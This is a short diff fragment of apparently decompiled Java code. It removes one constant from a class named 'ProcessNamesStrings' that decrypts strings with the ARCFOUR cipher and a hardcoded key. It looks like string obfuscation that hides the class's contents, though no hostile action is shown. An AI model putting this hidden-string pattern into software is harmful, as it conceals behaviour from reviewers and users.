@@ -7,7 +7,6 @@ import sun.misc.BASE64Decoder;
 public class ProcessNamesStrings {
    public static String v = "ARCFOUR";
    public static String p = "Zf1Ma8jiWK52a9o5";
-   private static final long a = 73842149703416L;
 
    public static String c(String string) {
       String string2 = "22TQFKRfe4GoC/rP+Sfz4Q==";
